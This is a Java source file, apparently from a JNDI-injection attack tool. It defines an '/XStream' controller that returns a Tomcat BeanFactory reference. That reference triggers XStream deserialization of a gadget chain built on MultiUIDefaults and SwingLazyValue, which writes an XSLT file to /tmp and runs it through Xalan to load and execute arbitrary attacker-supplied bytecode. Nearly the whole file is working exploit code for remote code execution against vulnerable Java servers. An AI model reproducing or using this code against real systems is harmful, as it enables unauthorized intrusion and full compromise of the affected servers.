package map.jndi.controller.bypass;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.bytecode.ClassFile;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.payload.XSLTPayload;
import map.jndi.template.XSLTLoader;
import map.jndi.util.MiscUtil;
import map.jndi.util.ReflectUtil;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.util.Base64;

@JNDIController
@JNDIMapping("/XStream")
public class XStreamController extends BasicController {
    @Override
    public Object process(byte[] byteCode) throws Exception {
        System.out.println("[Reference] Factory: BeanFactory + XStream");

        ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
        String className = classFile.getName();

        String fileName =  MiscUtil.getRandStr(8);
        String xsltPath = "/tmp/" + fileName + ".lock";
        String classPath = "/tmp/" + fileName + ".class";

        String loaderClassName = MiscUtil.getClassName();
        ClassPool pool = ClassPool.getDefault();
        CtClass loaderClazz = pool.get(XSLTLoader.class.getName());
        loaderClazz.replaceClassName(loaderClazz.getName(), loaderClassName);

        ReflectUtil.setCtField(loaderClazz, "xsltPath", CtField.Initializer.constant(xsltPath));
        ReflectUtil.setCtField(loaderClazz, "classPath", CtField.Initializer.constant(classPath));
        ReflectUtil.setCtField(loaderClazz, "className", CtField.Initializer.constant(className));
        ReflectUtil.setCtField(loaderClazz, "payload", CtField.Initializer.constant(Base64.getEncoder().encodeToString(byteCode)));

        String xsltContent = XSLTPayload.loadClass(loaderClassName, loaderClazz.toBytecode());
        String payload = "<sorted-set>" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>" +
                "    <type>test</type>" +
                "    <value class=\"javax.swing.MultiUIDefaults\" serialization=\"custom\">" +
                "      <unserializable-parents/>" +
                "      <hashtable>" +
                "        <default>" +
                "          <loadFactor>0.75</loadFactor>" +
                "          <threshold>525</threshold>" +
                "        </default>" +
                "        <int>700</int>" +
                "        <int>0</int>" +
                "      </hashtable>" +
                "      <javax.swing.UIDefaults>" +
                "        <default>" +
                "          <defaultLocale>zh_CN</defaultLocale>" +
                "          <resourceCache/>" +
                "        </default>" +
                "      </javax.swing.UIDefaults>" +
                "      <javax.swing.MultiUIDefaults>" +
                "        <default>" +
                "          <tables>" +
                "            <javax.swing.UIDefaults serialization=\"custom\">" +
                "              <unserializable-parents/>" +
                "              <hashtable>" +
                "                <default>" +
                "                  <loadFactor>0.75</loadFactor>" +
                "                  <threshold>525</threshold>" +
                "                </default>" +
                "                <int>700</int>" +
                "                <int>2</int>" +
                "                <string>1</string>" +
                "                <sun.swing.SwingLazyValue>" +
                "                  <className>com.sun.org.apache.xml.internal.security.utils.JavaUtils</className>" +
                "                  <methodName>writeBytesToFilename</methodName>" +
                "                  <args>" +
                "                    <string>" + xsltPath + "</string>" +
                "                    <byte-array>" + Base64.getEncoder().encodeToString(xsltContent.getBytes()) + "</byte-array>" +
                "                  </args>" +
                "                </sun.swing.SwingLazyValue>" +
                "                <string>2</string>" +
                "                <sun.swing.SwingLazyValue>" +
                "                  <className>com.sun.org.apache.xalan.internal.xslt.Process</className>" +
                "                  <methodName>_main</methodName>" +
                "                  <args>" +
                "                    <string-array>" +
                "                      <string>-XT</string>" +
                "                      <string>-XSL</string>" +
                "                      <string>file://" + xsltPath + "</string>" +
                "                    </string-array>" +
                "                  </args>" +
                "                </sun.swing.SwingLazyValue>" +
                "              </hashtable>" +
                "              <javax.swing.UIDefaults>" +
                "                <default>" +
                "                  <defaultLocale reference=\"../../../../../../../javax.swing.UIDefaults/default/defaultLocale\"/>" +
                "                  <resourceCache/>" +
                "                </default>" +
                "              </javax.swing.UIDefaults>" +
                "            </javax.swing.UIDefaults>" +
                "          </tables>" +
                "        </default>" +
                "      </javax.swing.MultiUIDefaults>" +
                "    </value>" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>" +
                "    <type>test</type>" +
                "    <value class=\"com.sun.org.apache.xpath.internal.objects.XString\">" +
                "      <m__obj class=\"string\">test</m__obj>" +
                "    </value>" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>" +
                "</sorted-set>";

        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=fromXML"));
        ref.add(new StringRefAddr("x", payload));

        return ref;
    }
}